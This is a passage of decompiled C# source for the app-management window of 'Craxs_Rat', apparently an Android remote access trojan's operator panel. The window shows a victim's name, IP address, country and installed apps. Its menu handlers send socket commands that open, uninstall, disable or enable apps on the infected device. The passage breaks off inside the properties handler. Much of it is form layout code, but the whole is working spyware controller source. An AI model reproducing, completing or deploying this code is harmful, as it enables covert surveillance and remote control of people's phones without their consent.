using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Craxs_Rat.sockets;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class Applications : Form
{
	private IContainer components;

	[AccessedThroughProperty("DGV0")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DataGridView _DGV0;

	[AccessedThroughProperty("OpenToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _OpenToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveToolStripMenuItem")]
	private ToolStripMenuItem _SaveToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveAsToolStripMenuItem")]
	private ToolStripMenuItem _SaveAsToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	[CompilerGenerated]
	[AccessedThroughProperty("BoxTitle")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private PictureBox _BoxTitle;

	[AccessedThroughProperty("PropertiesToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _PropertiesToolStripMenuItem;

	[CompilerGenerated]
	[AccessedThroughProperty("RefreshToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _RefreshToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UninstallToolStripMenuItem")]
	private ToolStripMenuItem _UninstallToolStripMenuItem;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("ClearAppDataToolStripMenuItem")]
	private ToolStripMenuItem _ClearAppDataToolStripMenuItem;

	[CompilerGenerated]
	[AccessedThroughProperty("EnableToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _EnableToolStripMenuItem;

	public TcpClient Client;

	public Client classClient;

	public string Title;

	public string tmpFolderUSER;

	public string tmpClientName;

	public string tmpCountry;

	public string tmpAddressIP;

	private bool BoxTitlePaintEventArgsWait;

	internal virtual DataGridView DGV0
	{
		[CompilerGenerated]
		get
		{
			return _DGV0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewRowsRemovedEventHandler value2 = DGV0_RowsRemoved;
			DataGridViewRowsAddedEventHandler value3 = DGV0_RowsAdded;
			EventHandler value4 = DGV0_SelectionChanged;
			DataGridView dataGridView = _DGV0;
			if (dataGridView != null)
			{
				dataGridView.RowsRemoved -= value2;
				dataGridView.RowsAdded -= value3;
				dataGridView.SelectionChanged -= value4;
			}
			_DGV0 = value;
			dataGridView = _DGV0;
			if (dataGridView != null)
			{
				dataGridView.RowsRemoved += value2;
				dataGridView.RowsAdded += value3;
				dataGridView.SelectionChanged += value4;
			}
		}
	}

	[field: AccessedThroughProperty("ctx")]
	internal virtual ContextMenuStrip ctx
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem OpenToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _OpenToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = OpenToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _OpenToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_OpenToolStripMenuItem = value;
			toolStripMenuItem = _OpenToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem SaveToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _SaveToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = SaveToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _SaveToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_SaveToolStripMenuItem = value;
			toolStripMenuItem = _SaveToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _SaveAsToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = SaveAsToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _SaveAsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_SaveAsToolStripMenuItem = value;
			toolStripMenuItem = _SaveAsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer TOpacity
	{
		[CompilerGenerated]
		get
		{
			return _TOpacity;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = TOpacity_Tick;
			System.Windows.Forms.Timer timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_TOpacity = value;
			timer = _TOpacity;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("PB")]
	internal virtual ProgressBar PB
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual PictureBox BoxTitle
	{
		[CompilerGenerated]
		get
		{
			return _BoxTitle;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			PaintEventHandler value2 = BoxTitle_Paint;
			EventHandler value3 = BoxTitle_Resize;
			PictureBox pictureBox = _BoxTitle;
			if (pictureBox != null)
			{
				pictureBox.Paint -= value2;
				pictureBox.Resize -= value3;
			}
			_BoxTitle = value;
			pictureBox = _BoxTitle;
			if (pictureBox != null)
			{
				pictureBox.Paint += value2;
				pictureBox.Resize += value3;
			}
		}
	}

	internal virtual ToolStripMenuItem PropertiesToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _PropertiesToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = PropertiesToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _PropertiesToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_PropertiesToolStripMenuItem = value;
			toolStripMenuItem = _PropertiesToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem RefreshToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _RefreshToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = RefreshToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _RefreshToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_RefreshToolStripMenuItem = value;
			toolStripMenuItem = _RefreshToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Column1")]
	internal virtual DataGridViewTextBoxColumn Column1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column6")]
	internal virtual DataGridViewTextBoxColumn Column6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column9")]
	internal virtual DataGridViewTextBoxColumn Column9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column2")]
	internal virtual DataGridViewTextBoxColumn Column2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Column3")]
	internal virtual DataGridViewImageColumn Column3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem UninstallToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _UninstallToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = UninstallToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _UninstallToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_UninstallToolStripMenuItem = value;
			toolStripMenuItem = _UninstallToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ClearAppDataToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ClearAppDataToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ClearAppDataToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ClearAppDataToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ClearAppDataToolStripMenuItem = value;
			toolStripMenuItem = _ClearAppDataToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem EnableToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _EnableToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = EnableToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _EnableToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_EnableToolStripMenuItem = value;
			toolStripMenuItem = _EnableToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("clinameinfo")]
	internal virtual Label clinameinfo
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ClientPic")]
	internal virtual PictureBox ClientPic
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Applications()
	{
		base.Load += Applications_Load;
		base.Activated += AngelAndroidForm_Activated;
		base.Deactivate += AngelAndroidForm_Deactivate;
		Title = "null";
		BoxTitlePaintEventArgsWait = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Craxs_Rat.Applications));
		this.DGV0 = new System.Windows.Forms.DataGridView();
		this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column9 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column3 = new System.Windows.Forms.DataGridViewImageColumn();
		this.ctx = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.OpenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RefreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.PropertiesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SaveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SaveAsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.UninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ClearAppDataToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.EnableToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		this.PB = new System.Windows.Forms.ProgressBar();
		this.BoxTitle = new System.Windows.Forms.PictureBox();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.clinameinfo = new System.Windows.Forms.Label();
		this.ClientPic = new System.Windows.Forms.PictureBox();
		((System.ComponentModel.ISupportInitialize)this.DGV0).BeginInit();
		this.ctx.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.BoxTitle).BeginInit();
		this.Panel2.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.ClientPic).BeginInit();
		base.SuspendLayout();
		this.DGV0.AllowUserToAddRows = false;
		this.DGV0.AllowUserToDeleteRows = false;
		this.DGV0.AllowUserToResizeColumns = false;
		this.DGV0.AllowUserToResizeRows = false;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.Black;
		this.DGV0.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.DGV0.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
		this.DGV0.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV0.BackgroundColor = System.Drawing.Color.Black;
		this.DGV0.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV0.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV0.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.DGV0.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGV0.Columns.AddRange(this.Column1, this.Column6, this.Column9, this.Column2, this.Column3);
		this.DGV0.ContextMenuStrip = this.ctx;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV0.DefaultCellStyle = dataGridViewCellStyle3;
		this.DGV0.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGV0.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGV0.EnableHeadersVisualStyles = false;
		this.DGV0.GridColor = System.Drawing.Color.FromArgb(42, 42, 42);
		this.DGV0.Location = new System.Drawing.Point(0, 39);
		this.DGV0.Margin = new System.Windows.Forms.Padding(4);
		this.DGV0.Name = "DGV0";
		this.DGV0.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle4.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.DGV0.RowHeadersVisible = false;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.Black;
		this.DGV0.RowsDefaultCellStyle = dataGridViewCellStyle5;
		this.DGV0.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV0.Size = new System.Drawing.Size(493, 457);
		this.DGV0.TabIndex = 4;
		this.Column1.HeaderText = "App Name";
		this.Column1.Name = "Column1";
		this.Column1.Width = 105;
		this.Column6.HeaderText = "Type";
		this.Column6.Name = "Column6";
		this.Column6.Width = 67;
		this.Column9.HeaderText = "App ID";
		this.Column9.Name = "Column9";
		this.Column9.Width = 80;
		this.Column2.HeaderText = "Install Time";
		this.Column2.Name = "Column2";
		this.Column2.Width = 114;
		this.Column3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		this.Column3.FillWeight = 1f;
		this.Column3.HeaderText = "";
		this.Column3.MinimumWidth = 2;
		this.Column3.Name = "Column3";
		this.Column3.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.Programmatic;
		this.Column3.Width = 2;
		this.ctx.BackColor = System.Drawing.Color.Black;
		this.ctx.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.ctx.Items.AddRange(new System.Windows.Forms.ToolStripItem[8] { this.OpenToolStripMenuItem, this.RefreshToolStripMenuItem, this.PropertiesToolStripMenuItem, this.SaveToolStripMenuItem, this.SaveAsToolStripMenuItem, this.UninstallToolStripMenuItem, this.ClearAppDataToolStripMenuItem, this.EnableToolStripMenuItem });
		this.ctx.Name = "ctx";
		this.ctx.RenderMode = System.Windows.Forms.ToolStripRenderMode.Professional;
		this.ctx.ShowImageMargin = false;
		this.ctx.Size = new System.Drawing.Size(148, 228);
		this.OpenToolStripMenuItem.Font = new System.Drawing.Font("Calibri", 12f);
		this.OpenToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(195, 5, 5);
		this.OpenToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("OpenToolStripMenuItem.Image");
		this.OpenToolStripMenuItem.Name = "OpenToolStripMenuItem";
		this.OpenToolStripMenuItem.Size = new System.Drawing.Size(147, 28);
		this.OpenToolStripMenuItem.Text = "Open";
		this.RefreshToolStripMenuItem.Font = new System.Drawing.Font("Calibri", 12f);
		this.RefreshToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(195, 5, 5);
		this.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem";
		this.RefreshToolStripMenuItem.Size = new System.Drawing.Size(147, 28);
		this.RefreshToolStripMenuItem.Text = "Refresh";
		this.PropertiesToolStripMenuItem.Font = new System.Drawing.Font("Calibri", 12f);
		this.PropertiesToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.PropertiesToolStripMenuItem.Name = "PropertiesToolStripMenuItem";
		this.PropertiesToolStripMenuItem.Size = new System.Drawing.Size(147, 28);
		this.PropertiesToolStripMenuItem.Text = "Properties";
		this.SaveToolStripMenuItem.Font = new System.Drawing.Font("Calibri", 12f);
		this.SaveToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.SaveToolStripMenuItem.Name = "SaveToolStripMenuItem";
		this.SaveToolStripMenuItem.Size = new System.Drawing.Size(147, 28);
		this.SaveToolStripMenuItem.Text = "Save";
		this.SaveToolStripMenuItem.Visible = false;
		this.SaveAsToolStripMenuItem.Font = new System.Drawing.Font("Calibri", 12f);
		this.SaveAsToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.SaveAsToolStripMenuItem.Name = "SaveAsToolStripMenuItem";
		this.SaveAsToolStripMenuItem.Size = new System.Drawing.Size(147, 28);
		this.SaveAsToolStripMenuItem.Text = "Save As";
		this.SaveAsToolStripMenuItem.Visible = false;
		this.UninstallToolStripMenuItem.Font = new System.Drawing.Font("Calibri", 12f);
		this.UninstallToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem";
		this.UninstallToolStripMenuItem.Size = new System.Drawing.Size(147, 28);
		this.UninstallToolStripMenuItem.Text = "uninstall";
		this.ClearAppDataToolStripMenuItem.Font = new System.Drawing.Font("Calibri", 12f);
		this.ClearAppDataToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.ClearAppDataToolStripMenuItem.Name = "ClearAppDataToolStripMenuItem";
		this.ClearAppDataToolStripMenuItem.Size = new System.Drawing.Size(147, 28);
		this.ClearAppDataToolStripMenuItem.Text = "Disable";
		this.EnableToolStripMenuItem.Font = new System.Drawing.Font("Calibri", 12f);
		this.EnableToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.EnableToolStripMenuItem.Name = "EnableToolStripMenuItem";
		this.EnableToolStripMenuItem.Size = new System.Drawing.Size(147, 28);
		this.EnableToolStripMenuItem.Text = "Enable";
		this.TOpacity.Interval = 1;
		this.PB.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.PB.Location = new System.Drawing.Point(0, 496);
		this.PB.Margin = new System.Windows.Forms.Padding(4);
		this.PB.Name = "PB";
		this.PB.Size = new System.Drawing.Size(493, 12);
		this.PB.TabIndex = 6;
		this.BoxTitle.BackColor = System.Drawing.Color.Black;
		this.BoxTitle.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.BoxTitle.ErrorImage = null;
		this.BoxTitle.InitialImage = null;
		this.BoxTitle.Location = new System.Drawing.Point(0, 508);
		this.BoxTitle.Margin = new System.Windows.Forms.Padding(4);
		this.BoxTitle.Name = "BoxTitle";
		this.BoxTitle.Size = new System.Drawing.Size(493, 22);
		this.BoxTitle.TabIndex = 7;
		this.BoxTitle.TabStop = false;
		this.Panel2.BackColor = System.Drawing.Color.Black;
		this.Panel2.Controls.Add(this.clinameinfo);
		this.Panel2.Controls.Add(this.ClientPic);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.ForeColor = System.Drawing.Color.SkyBlue;
		this.Panel2.Location = new System.Drawing.Point(0, 0);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(493, 39);
		this.Panel2.TabIndex = 8;
		this.clinameinfo.BackColor = System.Drawing.Color.Transparent;
		this.clinameinfo.Dock = System.Windows.Forms.DockStyle.Fill;
		this.clinameinfo.Font = new System.Drawing.Font("Calibri", 9f);
		this.clinameinfo.ForeColor = System.Drawing.Color.SkyBlue;
		this.clinameinfo.Location = new System.Drawing.Point(42, 0);
		this.clinameinfo.Name = "clinameinfo";
		this.clinameinfo.Size = new System.Drawing.Size(451, 39);
		this.clinameinfo.TabIndex = 12;
		this.clinameinfo.Text = "...";
		this.clinameinfo.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.ClientPic.Dock = System.Windows.Forms.DockStyle.Left;
		this.ClientPic.Location = new System.Drawing.Point(0, 0);
		this.ClientPic.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.ClientPic.Name = "ClientPic";
		this.ClientPic.Size = new System.Drawing.Size(42, 39);
		this.ClientPic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.ClientPic.TabIndex = 11;
		this.ClientPic.TabStop = false;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(493, 530);
		base.Controls.Add(this.DGV0);
		base.Controls.Add(this.PB);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.BoxTitle);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.SizableToolWindow;
		base.Margin = new System.Windows.Forms.Padding(4);
		base.Name = "Applications";
		base.Opacity = 0.0;
		base.ShowIcon = false;
		this.Text = "Applications By DarKnetJoKer";
		((System.ComponentModel.ISupportInitialize)this.DGV0).EndInit();
		this.ctx.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.BoxTitle).EndInit();
		this.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.ClientPic).EndInit();
		base.ResumeLayout(false);
	}

	public void CraxsStyle()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
			{
				ctx.Items[0].Text = "打开";
				ctx.Items[1].Text = "刷新";
				ctx.Items[2].Text = "特性";
				ctx.Items[3].Text = "节省";
				ctx.Items[4].Text = "另存为";
				ctx.Items[5].Text = "卸载";
				ctx.Items[6].Text = "禁用";
				ctx.Items[7].Text = "使能够";
			}
		}
		else
		{
			ctx.Items[0].Text = "فتح";
			ctx.Items[1].Text = "تحديث";
			ctx.Items[2].Text = "خصائص";
			ctx.Items[3].Text = "حفظ";
			ctx.Items[4].Text = "حفظ كـ";
			ctx.Items[5].Text = "إلغاء التثبيت";
			ctx.Items[6].Text = "تعطيل";
			ctx.Items[7].Text = "تفعيل";
		}
	}

	private void SpyStyle()
	{
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			TOpacity.Enabled = false;
		}
	}

	private void Applications_Load(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\2.ico");
		CraxsStyle();
		try
		{
			ClientPic.Image = classClient.Wallpaper;
			clinameinfo.Text = "Name: " + classClient.ClientName + Strings.Space(2) + "IP: " + classClient.ClientAddressIP + Strings.Space(2) + "Country: " + classClient.Country;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
		DGV0.DefaultCellStyle.Font = reso.f;
		if (Operators.CompareString(SpySettings.SAVING_DATA, "No", TextCompare: false) == 0)
		{
			SaveToolStripMenuItem.Visible = true;
			SaveAsToolStripMenuItem.Visible = true;
		}
		Text = Title;
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
		BoxTitlePaintEventArgsWait = true;
	}

	private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				string text = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[2].Value);
				if (classClient != null)
				{
					object[] parametersObjects = new object[4]
					{
						Client,
						SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".apps" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "open" + Data.SPL_DATA + text,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
				}
			}
		}
	}

	private void PropertiesToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				string text = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[2].Value);
				if (classClient != null)
				{
					object[] parametersObjects = new object[4]
					{
						Client,
						SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".apps" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.AppsProperties + Data.SPL_SOCKET + "properties" + Data.SPL_DATA + text,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
				}
